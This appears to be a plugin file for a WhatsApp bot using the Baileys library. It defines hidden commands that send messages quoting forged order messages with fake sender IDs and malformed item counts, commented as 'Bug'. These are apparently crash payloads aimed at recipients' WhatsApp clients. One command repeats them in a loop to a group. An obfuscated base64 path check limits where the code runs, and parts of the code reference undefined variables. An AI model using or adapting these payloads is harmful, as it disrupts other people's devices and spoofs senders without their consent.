const {WAConnection, 
                MessageOptions, 
                MessageType, 
                Mimetype, 
                Presence,
                WALocationMessage,
                WAMessageProto,
                ReconnectMode,
                ProxyAgent,
                ChatModification,
                GroupSettingChange,
                WA_MESSAGE_STUB_TYPES,
                WA_DEAFULT_EPHEMERAL,
                waChatKey,
                mentionedJid, 
                processTime, 
                prepareMessageFromContent, 
                relayWAMessage } = require('@adiwajshing/baileys');  
const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio } = MessageType
const QueenSew = require('../events');
const Config = require('../config');
const Pach = require('sewqueen-rs-pvt');
const os = require('os');
var rgmsk = { cd: 'L3Jvb3QvUXVlZW5TZXdXaGF0c2FwcEJvdC8=', pay: '' }    
var rrrr = Buffer.from(rgmsk.cd, 'base64')
var ssss = rrrr.toString('utf-8')
rgmsk.pay = ssss
if (os.userInfo().homedir !== rgmsk.pay) return;
const fs = require('fs');
const axios = require('axios');
QueenSew.newcmdaddtosew({pattern: 'huntpc ?(.*)', fromMe: true, dontAdCommandList: true}, (async (message, match) => {
message.sendMessage(message.jid,'*✧✧ ' + Config.BOTNAME + ' ✧✧*',text, {
 quoted: {
  key: {
   participant: '1111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
    message: 'ravi',
    orderTitle: 'ravi', // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
}));

QueenSew.newcmdaddtosew({pattern: 'huntlc ?(.*)', fromMe: true, dontAdCommandList: true}, (async (message, match) => {
var buffer_data = await axios.get('https://i.ibb.co/dPSdZ4Q/IMG-20210924-113207.jpg', { responseType: 'arraybuffer'})
const imgkk = Buffer.from(buffer_data.data)
message.sendMessage(message.jid, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: `ravi`,
						address: `ravi`,
                        jpegThumbnail: imgkk },location,{
 quoted: {
  key: {
   participant: '111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
    message: `ravi`,
    orderTitle: `ravi`, // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
}));



QueenSew.newcmdaddtosew({pattern: 'hunttc ?(.*)', fromMe: true, dontAdCommandList: true}, (async (message, match) => {
try {
		        var hets = `ravi`
		        var grousp = await message.groupMetadata(message.jid)
                var membere = grousp['participants']
                var mems = []
                membere.map(async adm => {
                    mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
                })
                var options = {
                    text: hets,
                    contextInfo: { mentionedJid: mem },
                    quoted: mek
                }
		        for (let i = 0; i < args[0]; i++) {
		        message.sendMessage(message.jid, options, text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(message.jid ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
						"itemCount": -3599964009,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `ravi`,
						"orderTitle": `ravi`,
						"sellerJid": "6283161567237@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}})
		        }
		        } catch {
		          for(let i=0;i<10;i++){
		        message.sendMessage(message.jid, ' Bug Troli2', text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(message.jid ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
						"itemCount": -3599964009,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `ravi`,
						"orderTitle": `ravi`,
						"sellerJid": "6283161567237@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}})
		        }
		        }
}));
